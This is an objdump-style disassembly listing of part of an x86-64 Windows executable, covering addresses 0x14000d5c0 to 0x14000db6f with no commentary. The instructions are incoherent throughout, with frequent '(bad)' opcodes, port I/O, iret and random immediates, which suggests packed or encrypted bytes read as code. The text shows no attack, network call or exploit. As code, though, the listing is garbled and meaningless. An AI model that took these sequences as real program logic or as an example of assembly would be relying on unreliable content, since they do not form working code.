   14000d5c0:	4f                   	rex.WRXB
   14000d5c1:	f3 ee                	repz out %al,(%dx)
   14000d5c3:	db cc                	fcmovne %st(4),%st
   14000d5c5:	00 2a                	add    %ch,(%rdx)
   14000d5c7:	e0 89                	loopne 0x14000d552
   14000d5c9:	4c 24 48             	rex.WR and $0x48,%al
   14000d5cc:	38 0c 40             	cmp    %cl,(%rax,%rax,2)
   14000d5cf:	e8 38 9a 03 f7       	call   0x13704700c
   14000d5d4:	34 ec                	xor    $0xec,%al
   14000d5d6:	30 2a                	xor    %ch,(%rdx)
   14000d5d8:	fe                   	(bad)
   14000d5d9:	10 28                	adc    %ch,(%rax)
   14000d5db:	67 bb 53 cd 49 20    	addr32 mov $0x2049cd53,%ebx
   14000d5e1:	67 ea                	addr32 (bad)
   14000d5e3:	88 b1 b9 05 cd 64    	mov    %dh,0x64cd05b9(%rcx)
   14000d5e9:	89 c3                	mov    %eax,%ebx
   14000d5eb:	1d 79 15 63 e7       	sbb    $0xe7631579,%eax
   14000d5f0:	03 08                	add    (%rax),%ecx
   14000d5f2:	93                   	xchg   %eax,%ebx
   14000d5f3:	c5 b4 b0             	(bad)
   14000d5f6:	70 af                	jo     0x14000d5a7
   14000d5f8:	19 ae 8a 4b 8b 75    	sbb    %ebp,0x758b4b8a(%rsi)
   14000d5fe:	5b                   	pop    %rbx
   14000d5ff:	49 c5 98 5e 8c 56 53 	rex.WB vdivps -0x3f7144ad(%rsi,%rdx,2),%xmm12,%xmm1
   14000d606:	bb 8e c0 
   14000d609:	2a 0e                	sub    (%rsi),%cl
   14000d60b:	3b 79 63             	cmp    0x63(%rcx),%edi
   14000d60e:	8a f8                	mov    %al,%bh
   14000d610:	23 59 88             	and    -0x78(%rcx),%ebx
   14000d613:	b3 37                	mov    $0x37,%bl
   14000d615:	4c 69 6e b0 27 0c b4 	imul   $0x3fb40c27,-0x50(%rsi),%r13
   14000d61c:	3f 
   14000d61d:	39 63 e0             	cmp    %esp,-0x20(%rbx)
   14000d620:	36 04 a7             	ss add $0xa7,%al
   14000d623:	30 f5                	xor    %dh,%ch
   14000d625:	28 21                	sub    %ah,(%rcx)
   14000d627:	bc 13 54 1d fc       	mov    $0xfc1d5413,%esp
   14000d62c:	81 8d 55 b0 1a f8 d2 	orl    $0xfa7fc8d2,-0x7e54fab(%rbp)
   14000d633:	c8 7f fa 
   14000d636:	9d                   	popf
   14000d637:	07                   	(bad)
   14000d638:	76 07                	jbe    0x14000d641
   14000d63a:	63 25 ba ff d1 29    	movsxd 0x29d1ffba(%rip),%esp        # 0x169d2d5fa
   14000d640:	0d b4 3c e4 90       	or     $0x90e43cb4,%eax
   14000d645:	88 00                	mov    %al,(%rax)
   14000d647:	f0 87 67 e4          	lock xchg %esp,-0x1c(%rdi)
   14000d64b:	65 5a                	gs pop %rdx
   14000d64d:	b4 67                	mov    $0x67,%ah
   14000d64f:	38 6f 14             	cmp    %ch,0x14(%rdi)
   14000d652:	8c e0                	mov    %fs,%eax
   14000d654:	da 45 9e             	fiaddl -0x62(%rbp)
   14000d657:	91                   	xchg   %eax,%ecx
   14000d658:	b1 d8                	mov    $0xd8,%cl
   14000d65a:	d6                   	udb
   14000d65b:	57                   	push   %rdi
   14000d65c:	ee                   	out    %al,(%dx)
   14000d65d:	38 3c 34             	cmp    %bh,(%rsp,%rsi,1)
   14000d660:	bc a3 1f ef 15       	mov    $0x15ef1fa3,%esp
   14000d665:	d0 68 d8             	shrb   $1,-0x28(%rax)
   14000d668:	60                   	(bad)
   14000d669:	47 8e 7c 23 de       	rex.RXB mov -0x22(%r11,%r12,1),%?
   14000d66e:	0e                   	(bad)
   14000d66f:	58                   	pop    %rax
   14000d670:	05 50 00 48 08       	add    $0x8480050,%eax
   14000d675:	6e                   	outsb  (%rsi),(%dx)
   14000d676:	b7 91                	mov    $0x91,%bh
   14000d678:	23 40 01             	and    0x1(%rax),%eax
   14000d67b:	38 2f                	cmp    %ch,(%rdi)
   14000d67d:	30 0f                	xor    %cl,(%rdi)
   14000d67f:	28 0f                	sub    %cl,(%rdi)
   14000d681:	3c 78                	cmp    $0x78,%al
   14000d683:	4f 20 bc 80 41 e5 41 	rex.WRXB and %r15b,0x2141e541(%r8,%r8,4)
   14000d68a:	21 
   14000d68b:	37                   	(bad)
   14000d68c:	9c                   	pushf
   14000d68d:	e0 03                	loopne 0x14000d692
   14000d68f:	4f b9 24 e3 2e 87 45 	rex.WRXB movabs $0x4d9c045872ee324,%r9
   14000d696:	c0 d9 04 
   14000d699:	df 00                	filds  (%rax)
   14000d69b:	b4 06                	mov    $0x6,%ah
   14000d69d:	45 f8                	rex.RB clc
   14000d69f:	83 26 2f             	andl   $0x2f,(%rsi)
   14000d6a2:	18 f6                	sbb    %dh,%dh
   14000d6a4:	c2 69 1e             	ret    $0x1e69
   14000d6a7:	e8 bd 89 c6 4b       	call   0x18bc76069
   14000d6ac:	be 63 c7 72 02       	mov    $0x272c763,%esi
   14000d6b1:	89 f2                	mov    %esi,%edx
   14000d6b3:	ea                   	(bad)
   14000d6b4:	1f                   	(bad)
   14000d6b5:	da d1                	fcmovbe %st(1),%st
   14000d6b7:	f8                   	clc
   14000d6b8:	8d 58 b0             	lea    -0x50(%rax),%ebx
   14000d6bb:	80 27 76             	andb   $0x76,(%rdi)
   14000d6be:	18 a1 e8 88 33 90    	sbb    %ah,-0x6fcc7718(%rcx)
   14000d6c4:	3e fe 01             	ds incb (%rcx)
   14000d6c7:	82                   	(bad)
   14000d6c8:	dd 63 9a             	frstor -0x66(%rbx)
   14000d6cb:	36 b1 89             	ss mov $0x89,%cl
   14000d6ce:	74 16                	je     0x14000d6e6
   14000d6d0:	c9                   	leave
   14000d6d1:	c9                   	leave
   14000d6d2:	59                   	pop    %rcx
   14000d6d3:	91                   	xchg   %eax,%ecx
   14000d6d4:	70 8a                	jo     0x14000d660
   14000d6d6:	d8 c5                	fadd   %st(5),%st
   14000d6d8:	e3 86                	jrcxz  0x14000d660
   14000d6da:	e0 19                	loopne 0x14000d6f5
   14000d6dc:	e4 42                	in     $0x42,%al
   14000d6de:	4e 9f                	rex.WRX lahf
   14000d6e0:	88 d8                	mov    %bl,%al
   14000d6e2:	85 06                	test   %eax,(%rsi)
   14000d6e4:	90                   	nop
   14000d6e5:	91                   	xchg   %eax,%ecx
   14000d6e6:	21 0c e0             	and    %ecx,(%rax,%riz,8)
   14000d6e9:	80 1b e4             	sbbb   $0xe4,(%rbx)
   14000d6ec:	90                   	nop
   14000d6ed:	41 d8 c3             	rex.B fadd %st(3),%st
   14000d6f0:	3c 91                	cmp    $0x91,%al
   14000d6f2:	05 c1 b0 13 89       	add    $0x8913b0c1,%eax
   14000d6f7:	c6 c3 23             	mov    $0x23,%bl
   14000d6fa:	89 20                	mov    %esp,(%rax)
   14000d6fc:	23 27                	and    (%rdi),%esp
   14000d6fe:	df d8                	(bad)
   14000d700:	c3                   	ret
   14000d701:	5c                   	pop    %rsp
   14000d702:	f0 1e                	lock (bad)
   14000d704:	bb 90 53 c1 d0       	mov    $0xd0c15390,%ebx
   14000d709:	89 da                	mov    %ebx,%edx
   14000d70b:	87 28                	xchg   %ebp,(%rax)
   14000d70d:	c5 60 e4             	(bad)
   14000d710:	42 0e                	rex.X (bad)
   14000d712:	c0 87 d4 d0 a6 e4 76 	rolb   $0x76,-0x1b592f2c(%rdi)
   14000d719:	80 89 bb 85 c5 c8 77 	orb    $0x77,-0x373a7a45(%rcx)
   14000d720:	17                   	(bad)
   14000d721:	1b 64 48 50          	sbb    0x50(%rax,%rcx,2),%esp
   14000d725:	5d                   	pop    %rbp
   14000d726:	33 50 c6             	xor    -0x3a(%rax),%edx
   14000d729:	32 80 bc 9c be c8    	xor    -0x37416344(%rax),%al
   14000d72f:	5b                   	pop    %rbx
   14000d730:	03 44 db b3          	add    -0x4d(%rbx,%rbx,8),%eax
   14000d734:	4b 1a cd             	rex.WXB sbb %r13b,%cl
   14000d737:	db ff                	(bad)
   14000d739:	86 87 90 53 1c 27    	xchg   %al,0x271c5390(%rdi)
   14000d73f:	ee                   	out    %al,(%dx)
   14000d740:	86 d4                	xchg   %dl,%ah
   14000d742:	86 a7 90 57 20 cf    	xchg   %ah,-0x30dfa870(%rdi)
   14000d748:	84 8b 86 af 40 0e    	test   %cl,0xe40af86(%rbx)
   14000d74e:	21 71 86             	and    %esi,-0x7a(%rcx)
   14000d751:	6c                   	insb   (%dx),(%rdi)
   14000d752:	84 bc 40 4e 21 28 86 	test   %bh,-0x79d7deb2(%rax,%rax,2)
   14000d759:	0f 86 9c 42 5e 81    	jbe    0xc15f19fb
   14000d75f:	0a 84 c6 85 bc 02 39 	or     0x3902bc85(%rsi,%rax,8),%al
   14000d766:	84 ac 85 a7 83 72 08 	test   %ch,0x87283a7(%rbp,%rax,4)
   14000d76d:	39 85 63 85 49 85    	cmp    %eax,-0x7ab67a9d(%rbp)
   14000d773:	d8 84 37 04 47 bf 10 	fadds  0x10bf4704(%rdi,%rsi,1)
   14000d77a:	0d 83 25 8c 08       	or     $0x88c2583,%eax
   14000d77f:	8c ff                	mov    %?,%edi
   14000d781:	2e 07                	cs (bad)
   14000d783:	d8 15 e8 1d 02 9d    	fcoms  -0x62fde218(%rip)        # 0xdd02f571
   14000d789:	96                   	xchg   %eax,%esi
   14000d78a:	35 27 ba 09 de       	xor    $0xde09ba27,%eax
   14000d78f:	42 74 04             	rex.X je 0x14000d796
   14000d792:	fd                   	std
   14000d793:	11 63 51             	adc    %esp,0x51(%rbx)
   14000d796:	f1                   	int1
   14000d797:	84 f1                	test   %dh,%cl
   14000d799:	a0 cb c4 1f 99 b8 9f 	movabs 0x78059fb8991fc4cb,%al
   14000d7a0:	05 78 
   14000d7a2:	c0 1a f5             	rcrb   $0xf5,(%rdx)
   14000d7a5:	85 fe                	test   %edi,%esi
   14000d7a7:	88 c2                	mov    %al,%dl
   14000d7a9:	2e df 11             	cs fists (%rcx)
   14000d7ac:	08 55 7e             	or     %dl,0x7e(%rbp)
   14000d7af:	90                   	nop
   14000d7b0:	4d 00 bf 4b 05 f2 03 	rex.WRB add %r15b,0x3f2054b(%r15)
   14000d7b7:	80 53 85 30          	adcb   $0x30,-0x7b(%rbx)
   14000d7bb:	fb                   	sti
   14000d7bc:	03 0e                	add    (%rsi),%ecx
   14000d7be:	fb                   	sti
   14000d7bf:	b8 ba 04 01 f3       	mov    $0xf30104ba,%eax
   14000d7c4:	df 82 f1 85 20 01    	filds  0x12085f1(%rdx)
   14000d7ca:	2f                   	(bad)
   14000d7cb:	75 c4                	jne    0x14000d791
   14000d7cd:	27                   	(bad)
   14000d7ce:	07                   	(bad)
   14000d7cf:	cf                   	iret
   14000d7d0:	05 9b 33 cb b0       	add    $0xb0cb339b,%eax
   14000d7d5:	64 64 e4 96          	fs fs in $0x96,%al
   14000d7d9:	cf                   	iret
   14000d7da:	1b b8 9a c0 64 64    	sbb    0x6464c09a(%rax),%edi
   14000d7e0:	64 64 97             	fs fs xchg %eax,%edi
   14000d7e3:	c8 93 d0 64          	enter  $0xd093,$0x64
   14000d7e7:	64 64 64 92          	fs fs fs xchg %eax,%edx
   14000d7eb:	d8 8d e0 6c 64 64    	fmuls  0x64646ce0(%rbp)
   14000d7f1:	64 8f e8 8e f0       	(bad)
   14000d7f6:	53                   	push   %rbx
   14000d7f7:	5c                   	pop    %rsp
   14000d7f8:	ce                   	(bad)
   14000d7f9:	16                   	(bad)
   14000d7fa:	1c f8                	sbb    $0xf8,%al
   14000d7fc:	cb                   	lret
   14000d7fd:	1b 00                	sbb    (%rax),%eax
   14000d7ff:	01 87 8c 8c 8c 8c    	add    %eax,-0x73737374(%rdi)
   14000d805:	08 82 10 80 f6 33    	or     %al,0x33f68010(%rdx)
   14000d80b:	fe 8c 18 c7 85 3c 03 	decb   0x33c85c7(%rax,%rbx,1)
   14000d812:	57                   	push   %rdi
   14000d813:	eb 70                	jmp    0x14000d885
   14000d815:	32 b5 3b 36 83 95    	xor    -0x6a7cc9c5(%rbp),%dh
   14000d81b:	ff 0c 45 a0 0d 94 17 	decl   0x17940da0(,%rax,2)
   14000d822:	fb                   	sti
   14000d823:	2b de                	sub    %esi,%ebx
   14000d825:	8a b8 89 c2 1d d6    	mov    -0x29e23d77(%rax),%bh
   14000d82b:	c7 00 2e 2e 5c 00    	movl   $0x5c2e2e,(%rax)
   14000d831:	8b 75 ed             	mov    -0x13(%rbp),%esi
   14000d834:	60                   	(bad)
   14000d835:	bf c4 00 94 c5       	mov    $0xc59400c4,%edi
   14000d83a:	b0 00                	mov    $0x0,%al
   14000d83c:	6f                   	outsl  (%rsi),(%dx)
   14000d83d:	8c 17                	mov    %ss,(%rdi)
   14000d83f:	9b                   	fwait
   14000d840:	e3 d7                	jrcxz  0x14000d819
   14000d842:	87 54 74 81          	xchg   %edx,-0x7f(%rsp,%rsi,2)
   14000d846:	1d 64 65 be 1b       	sbb    $0x1bbe6564,%eax
   14000d84b:	3e e2 ee             	loop,pt 0x14000d83c
   14000d84e:	ef                   	out    %eax,(%dx)
   14000d84f:	83 73 01 83          	xorl   $0xffffff83,0x1(%rbx)
   14000d853:	bd 0d 0d 7e 87       	mov    $0x877e0d0d,%ebp
   14000d858:	ad                   	lods   (%rsi),%eax
   14000d859:	03 de                	add    %esi,%ebx
   14000d85b:	70 ac                	jo     0x14000d809
   14000d85d:	50                   	push   %rax
   14000d85e:	75 c7                	jne    0x14000d827
   14000d860:	4d 61                	rex.WRB (bad)
   14000d862:	f8                   	clc
   14000d863:	09 c7                	or     %eax,%edi
   14000d865:	07                   	(bad)
   14000d866:	df a2 ce 5d f4 f0    	fbld   -0xf0ba232(%rdx)
   14000d86c:	29 66 b7             	sub    %esp,-0x49(%rsi)
   14000d86f:	99                   	cltd
   14000d870:	c2 b9 0d             	ret    $0xdb9
   14000d873:	41 ec                	rex.B in (%dx),%al
   14000d875:	15 89 05 4b 6e       	adc    $0x6e4b0589,%eax
   14000d87a:	9d                   	popf
   14000d87b:	1c ed                	sbb    $0xed,%al
   14000d87d:	a8 13                	test   $0x13,%al
   14000d87f:	17                   	(bad)
   14000d880:	6b 6e 0e e0          	imul   $0xffffffe0,0xe(%rsi),%ebp
   14000d884:	ef                   	out    %eax,(%dx)
   14000d885:	0c 9b                	or     $0x9b,%al
   14000d887:	41 b6 6b             	mov    $0x6b,%r14b
   14000d88a:	1d 3c 7e 32 00       	sbb    $0x327e3c,%eax
   14000d88f:	00 40 4e             	add    %al,0x4e(%rax)
   14000d892:	c8 bb 77 ac          	enter  $0x77bb,$0xac
   14000d896:	1c ff                	sbb    $0xff,%al
   14000d898:	80 33 51             	xorb   $0x51,(%rbx)
   14000d89b:	c3                   	ret
   14000d89c:	b1 e4                	mov    $0xe4,%cl
   14000d89e:	f9                   	stc
   14000d89f:	95                   	xchg   %eax,%ebp
   14000d8a0:	53                   	push   %rbx
   14000d8a1:	25 8a 84 d8 8f       	and    $0x8fd8848a,%eax
   14000d8a6:	8d 6c 58 b0          	lea    -0x50(%rax,%rbx,2),%ebp
   14000d8aa:	20 f3                	and    %dh,%bl
   14000d8ac:	97                   	xchg   %eax,%edi
   14000d8ad:	4f 27                	rex.WRXB (bad)
   14000d8af:	1e                   	(bad)
   14000d8b0:	13 29                	adc    (%rcx),%ebp
   14000d8b2:	f3 1f                	repz (bad)
   14000d8b4:	85 eb                	test   %ebp,%ebx
   14000d8b6:	51                   	push   %rcx
   14000d8b7:	08 9a eb e4 20 20    	or     %bl,0x2020e4eb(%rdx)
   14000d8bd:	03 64 70 57          	add    0x57(%rax,%rsi,2),%esp
   14000d8c1:	92                   	xchg   %eax,%edx
   14000d8c2:	87 8c fc ad 8b db 68 	xchg   %ecx,0x68db8bad(%rsp,%rdi,8)
   14000d8c9:	0b 88 13 4f c4 f8    	or     -0x73bb0ed(%rax),%ecx
   14000d8cf:	61                   	(bad)
   14000d8d0:	da bb fe 7f b9 d3    	fidivrl -0x2c468002(%rbx)
   14000d8d6:	4d 62 c9 09 b9 90    	(bad)
   14000d8dc:	10 f4                	adc    %dh,%ah
   14000d8de:	39 80 b8 94 15 4e    	cmp    %eax,0x4e1594b8(%rax)
   14000d8e4:	12 8d 9b 94 5b 4d    	adc    0x4d5b949b(%rbp),%cl
   14000d8ea:	7f 56                	jg     0x14000d942
   14000d8ec:	a9 0d 4b ba 06       	test   $0x6ba4b0d,%eax
   14000d8f1:	cc                   	int3
   14000d8f2:	b8 00 bb 72 0a       	mov    $0xa72bb00,%eax
   14000d8f7:	79 1b                	jns    0x14000d914
   14000d8f9:	37                   	(bad)
   14000d8fa:	08 64 10 27          	or     %ah,0x27(%rax,%rdx,1)
   14000d8fe:	c8 29 e4 14          	enter  $0xe429,$0x14
   14000d902:	0a 2b                	or     (%rbx),%ch
   14000d904:	11 bb 9b 28 1e 16    	adc    %edi,0x161e289b(%rbx)
   14000d90a:	fa                   	cli
   14000d90b:	13 19                	adc    (%rcx),%ebx
   14000d90d:	74 1d                	je     0x14000d92c
   14000d90f:	03 39                	add    (%rcx),%edi
   14000d911:	21 13                	and    %edx,(%rbx)
   14000d913:	c5 2e 34             	(bad)
   14000d916:	90                   	nop
   14000d917:	09 99 90 5f 80 95    	or     %ebx,-0x6a7fa070(%rcx)
   14000d91d:	35 15 2c 99 aa       	xor    $0xaa992c15,%eax
   14000d922:	1d 70 d8 1b 3b       	sbb    $0x3b1bd870,%eax
   14000d927:	0c cb                	or     $0xcb,%al
   14000d929:	c4                   	(bad)
   14000d92a:	14 11                	adc    $0x11,%al
   14000d92c:	e9 b5 35 0f 03       	jmp    0x143100ee6
   14000d931:	37                   	(bad)
   14000d932:	fe 8f d6 35 f7 37    	decb   0x37f735d6(%rdi)
   14000d938:	d3 7e bc             	sarl   %cl,-0x44(%rsi)
   14000d93b:	1b 9a 89 83 d0 06    	sbb    0x6d08389(%rdx),%ebx
   14000d941:	74 0a                	je     0x14000d94d
   14000d943:	8b 28                	mov    (%rax),%ebp
   14000d945:	16                   	(bad)
   14000d946:	c6 07 7b             	movb   $0x7b,(%rdi)
   14000d949:	a1 c7 6f fd 37 af 38 	movabs 0xff6f38af37fd6fc7,%eax
   14000d950:	6f ff 
   14000d952:	de 40 9a             	fiadds -0x66(%rax)
   14000d955:	91                   	xchg   %eax,%ecx
   14000d956:	7f f8                	jg     0x14000d950
   14000d958:	f8                   	clc
   14000d959:	41 8a f1             	mov    %r9b,%sil
   14000d95c:	04 2d                	add    $0x2d,%al
   14000d95e:	21 1c 31             	and    %ebx,(%rcx,%rsi,1)
   14000d961:	84 ba 01 01 c2 1c    	test   %bh,0x1cc20101(%rdx)
   14000d967:	de 71 50             	fidivs 0x50(%rcx)
   14000d96a:	7e 1b                	jle    0x14000d987
   14000d96c:	05 2c f9 24 b1       	add    $0xb124f92c,%eax
   14000d971:	de e4                	fsubp  %st,%st(4)
   14000d973:	55                   	push   %rbp
   14000d974:	6f                   	outsl  (%rsi),(%dx)
   14000d975:	00 00                	add    %al,(%rax)
   14000d977:	ec                   	in     (%dx),%al
   14000d978:	4c 7a a1             	rex.WR jp 0x14000d91c
   14000d97b:	c4                   	(bad)
   14000d97c:	2b 46 ba             	sub    -0x46(%rsi),%eax
   14000d97f:	77 bd                	ja     0x14000d93e
   14000d981:	7d 71                	jge    0x14000d9f4
   14000d983:	90                   	nop
   14000d984:	21 39                	and    %edi,(%rcx)
   14000d986:	62 69 e7 88 19       	(bad)
   14000d98b:	92                   	xchg   %eax,%edx
   14000d98c:	29 64 c8 ce          	sub    %esp,-0x32(%rax,%rcx,8)
   14000d990:	53                   	push   %rbx
   14000d991:	21 99 42 06 d0 b5    	and    %ebx,-0x4a2ff9be(%rcx)
   14000d997:	92                   	xchg   %eax,%edx
   14000d998:	29 64 90 1e          	sub    %esp,0x1e(%rax,%rdx,4)
   14000d99c:	d8 9c 32 85 9c 1c e9 	fcomps -0x16e3637b(%rdx,%rsi,1)
   14000d9a3:	7c e0                	jl     0x14000d985
   14000d9a5:	83 53 c8 20          	adcl   $0x20,-0x38(%rbx)
   14000d9a9:	43 b4 e8             	rex.XB mov $0xe8,%r12b
   14000d9ac:	6a 84                	push   $0xffffffffffffff84
   14000d9ae:	08 32                	or     %dh,(%rdx)
   14000d9b0:	24 7f                	and    $0x7f,%al
   14000d9b2:	ca 23 ec             	lret   $0xec23
   14000d9b5:	80 19 82             	sbbb   $0x82,(%rcx)
   14000d9b8:	4e de ff             	rex.WRX fdivrp %st,%st(7)
   14000d9bb:	41 21 22             	and    %esp,(%r10)
   14000d9be:	2d b3 8b a8 07       	sub    $0x7a88bb3,%eax
   14000d9c3:	49 e2 4d             	rex.WB loop 0x14000da13
   14000d9c6:	71 20                	jno    0x14000d9e8
   14000d9c8:	a7                   	cmpsl  (%rdi),(%rsi)
   14000d9c9:	18 cb                	sbb    %cl,%bl
   14000d9cb:	f3 ec                	repz in (%dx),%al
   14000d9cd:	37                   	(bad)
   14000d9ce:	05 07 37 c3 71       	add    $0x71c33707,%eax
   14000d9d3:	85 dd                	test   %ebx,%ebp
   14000d9d5:	70 ff                	jo     0x14000d9d6
   14000d9d7:	25 f2 f6 90 f0       	and    $0xf090f6f2,%eax
   14000d9dc:	a7                   	cmpsl  (%rdi),(%rsi)
   14000d9dd:	42 ac                	rex.X lods (%rsi),%al
   14000d9df:	90                   	nop
   14000d9e0:	1f                   	(bad)
   14000d9e1:	1f                   	(bad)
   14000d9e2:	85 1c 04             	test   %ebx,(%rsp,%rax,1)
   14000d9e5:	43 0d 01 65 22 af    	rex.XB or $0xaf226501,%eax
   14000d9eb:	b9 5b bb fb 20       	mov    $0x20fbbb5b,%ecx
   14000d9f0:	05 6f 2b 8d 50       	add    $0x508d2b6f,%eax
   14000d9f5:	08 14 40             	or     %dl,(%rax,%rax,2)
   14000d9f8:	06                   	(bad)
   14000d9f9:	89 15 60 1d 0f e5    	mov    %edx,-0x1af0e2a0(%rip)        # 0x1250ff75f
   14000d9ff:	a9 6e fc e3 2b       	test   $0x2be3fc6e,%eax
   14000da04:	ff 56 ff             	call   *-0x1(%rsi)
   14000da07:	8e ca                	mov    %edx,%cs
   14000da09:	b3 53                	mov    $0x53,%bl
   14000da0b:	83 15 63 3c 02 8e 83 	adcl   $0xffffff83,-0x71fdc39d(%rip)        # 0xce031675
   14000da12:	f8                   	clc
   14000da13:	ff 74 39 85          	push   -0x7b(%rcx,%rdi,1)
   14000da17:	c9                   	leave
   14000da18:	74 ea                	je     0x14000da04
   14000da1a:	e6 ba                	out    %al,$0xba
   14000da1c:	fd                   	std
   14000da1d:	20 89 c8 83 e9 01    	and    %cl,0x1e983c8(%rcx)
   14000da23:	7c 1c                	jl     0x14000da41
   14000da25:	c2 48 5a             	ret    $0x5a48
   14000da28:	0c 74                	or     $0x74,%al
   14000da2a:	c2 f8 3a             	ret    $0x3af8
   14000da2d:	f5                   	cmc
   14000da2e:	d6                   	udb
   14000da2f:	7e 5e                	jle    0x14000da8f
   14000da31:	ff 13                	call   *(%rbx)
   14000da33:	5e                   	pop    %rsi
   14000da34:	eb 98                	jmp    0x14000d9ce
   14000da36:	39 f3                	cmp    %esi,%ebx
   14000da38:	75 f5                	jne    0x14000da2f
   14000da3a:	94                   	xchg   %eax,%esp
   14000da3b:	7e 20                	jle    0x14000da5d
   14000da3d:	a7                   	cmpsl  (%rdi),(%rsi)
   14000da3e:	be 13 92 98 5b       	mov    $0x5b989213,%esi
   14000da43:	5e                   	pop    %rsi
   14000da44:	a1 d6 db 67 0a ba af 	movabs 0x8d44afba0a67dbd6,%eax
   14000da4b:	44 8d 
   14000da4d:	40 01 96 4a 83 3c c2 	rex add %edx,-0x3dc37cb6(%rsi)
   14000da54:	e0 82                	loopne 0x14000d9d8
   14000da56:	ec                   	in     (%dx),%al
   14000da57:	a6                   	cmpsb  (%rdi),(%rsi)
   14000da58:	c6                   	(bad)
   14000da59:	e4 f0                	in     $0xf0,%al
   14000da5b:	eb ad                	jmp    0x14000da0a
   14000da5d:	2f                   	(bad)
   14000da5e:	28 ca                	sub    %cl,%dl
   14000da60:	68 00 e0 8f 80       	push   $0xffffffff808fe000
   14000da65:	27                   	(bad)
   14000da66:	58                   	pop    %rax
   14000da67:	06                   	(bad)
   14000da68:	1f                   	(bad)
   14000da69:	c7 05 b6 68 88 65 bf 	movl   $0x82170bbf,0x658868b6(%rip)        # 0x1a5894329
   14000da70:	0b 17 82 
   14000da73:	17                   	(bad)
   14000da74:	1c 90                	sbb    $0x90,%al
   14000da76:	7e 23                	jle    0x14000da9b
   14000da78:	55                   	push   %rbp
   14000da79:	f8                   	clc
   14000da7a:	6f                   	outsl  (%rsi),(%dx)
   14000da7b:	30 3b                	xor    %bh,(%rbx)
   14000da7d:	83 fa 03             	cmp    $0x3,%edx
   14000da80:	74 17                	je     0x14000da99
   14000da82:	85 d2                	test   %edx,%edx
   14000da84:	74 13                	je     0x14000da99
   14000da86:	a7                   	cmpsl  (%rdi),(%rsi)
   14000da87:	da a3 50 eb 28 c3    	fisubl -0x3cd714b0(%rbx)
   14000da8d:	1f                   	(bad)
   14000da8e:	b0 22                	mov    $0x22,%al
   14000da90:	3c 2f                	cmp    $0x2f,%al
   14000da92:	9e                   	sahf
   14000da93:	80 87 60 90 9f 05 73 	addb   $0x73,0x59f9060(%rdi)
   14000da9a:	3b b2 02 cd 06 12    	cmp    0x1206cd02(%rdx),%esi
   14000daa0:	c0 ce a2             	ror    $0xa2,%dh
   14000daa3:	c4                   	(bad)
   14000daa4:	86 14 13             	xchg   %dl,(%rbx,%rdx,1)
   14000daa7:	6e                   	outsb  (%rsi),(%dx)
   14000daa8:	09 c6                	or     %eax,%esi
   14000daaa:	6e                   	outsb  (%rsi),(%dx)
   14000daab:	08 01                	or     %al,(%rcx)
   14000daad:	74 4e                	je     0x14000dafd
   14000daaf:	59                   	pop    %rcx
   14000dab0:	68 7e 7a b7 c3       	push   $0xffffffffc3b77a7e
   14000dab5:	05 88 1d 31 88       	add    $0x88311d88,%eax
   14000daba:	4b 35 2a 0d 39 de    	rex.WXB xor $0xffffffffde390d2a,%rax
   14000dac0:	74 df                	je     0x14000daa1
   14000dac2:	3c aa                	cmp    $0xaa,%al
   14000dac4:	c3                   	ret
   14000dac5:	dc 8f 03 99 02 ee    	fmull  -0x11fd66fd(%rdi)
   14000dacb:	c3                   	ret
   14000dacc:	27                   	(bad)
   14000dacd:	d8 60 1f             	fsubs  0x1f(%rax)
   14000dad0:	de de                	(bad)
   14000dad2:	75 ed                	jne    0x14000dac1
   14000dad4:	71 ff                	jno    0x14000dad5
   14000dad6:	5b                   	pop    %rbx
   14000dad7:	5e                   	pop    %rsi
   14000dad8:	a1 60 71 01 df 9f 90 	movabs 0xfdbd909fdf017160,%eax
   14000dadf:	bd fd 
   14000dae1:	07                   	(bad)
   14000dae2:	3f                   	(bad)
   14000dae3:	78 0f                	js     0x14000daf4
   14000dae5:	11 74 24 40          	adc    %esi,0x40(%rsp)
   14000dae9:	08 7c 24 50          	or     %bh,0x50(%rsp)
   14000daed:	44 0a 0f             	or     (%rdi),%r9b
   14000daf0:	3b 80 af 08 83 39    	cmp    0x398308af(%rax),%eax
   14000daf6:	06                   	(bad)
   14000daf7:	0f 87 6a 78 8b e0    	ja     0x1208c5367
   14000dafd:	15 d6 26 7c a9       	adc    $0xa97c26d6,%eax
   14000db02:	0c 0e                	or     $0xe,%al
   14000db04:	63 04 82             	movsxd (%rdx,%rax,4),%eax
   14000db07:	b4 ff                	mov    $0xff,%ah
   14000db09:	e0 bd                	loopne 0x14000dac8
   14000db0b:	7d 14                	jge    0x14000db21
   14000db0d:	ec                   	in     (%dx),%al
   14000db0e:	8f                   	(bad)
   14000db0f:	4e                   	rex.WRX
   14000db10:	f0 34 f2             	lock xor $0xf2,%al
   14000db13:	5e                   	pop    %rsi
   14000db14:	10 41 20             	adc    %al,0x20(%rcx)
   14000db17:	f2 05 2c d6 b3 08    	repnz add $0x8b3d62c,%eax
   14000db1d:	79 18                	jns    0x14000db37
   14000db1f:	71 64                	jno    0x14000db85
   14000db21:	71 08                	jno    0x14000db2b
   14000db23:	ee                   	out    %al,(%dx)
   14000db24:	be 7f df eb 27       	mov    $0x27ebdf7f,%esi
   14000db29:	cc                   	int3
   14000db2a:	f2 9b                	repnz fwait
   14000db2c:	30 49 89             	xor    %cl,-0x77(%rcx)
   14000db2f:	d8 8a 9a 38 5c c7    	fmuls  -0x38a3c766(%rdx)
   14000db35:	01 af 29 0c 1a 10    	add    %ebp,0x101a0c29(%rdi)
   14000db3b:	24 f1                	and    $0xf1,%al
   14000db3d:	16                   	(bad)
   14000db3e:	74 04                	je     0x14000db44
   14000db40:	a7                   	cmpsl  (%rdi),(%rsi)
   14000db41:	b3 5b                	mov    $0x5b,%bl
   14000db43:	43 28 4c 90 74       	sub    %cl,0x74(%r8,%r10,4)
   14000db48:	ff 10                	call   *(%rax)
   14000db4a:	3e 1d ce c1 e0 a2    	ds sbb $0xa2e0c1ce,%eax
   14000db50:	02 7a 78             	add    0x78(%rdx),%bh
   14000db53:	1f                   	(bad)
   14000db54:	69 26 e9 a6 7d ce    	imul   $0xce7da6e9,(%rsi),%esp
   14000db5a:	eb 96                	jmp    0x14000daf2
   14000db5c:	ef                   	out    %eax,(%dx)
   14000db5d:	b9 1f 86 89 cd       	mov    $0xcd89861f,%ecx
   14000db62:	11 78 71             	adc    %edi,0x71(%rax)
   14000db65:	58                   	pop    %rax
   14000db66:	18 cb                	sbb    %cl,%bl
   14000db68:	9f                   	lahf
   14000db69:	1e                   	(bad)
   14000db6a:	e9 e4 0b 72 21       	jmp    0x16172e753
   14000db6f:	b1 16                	mov    $0x16,%cl
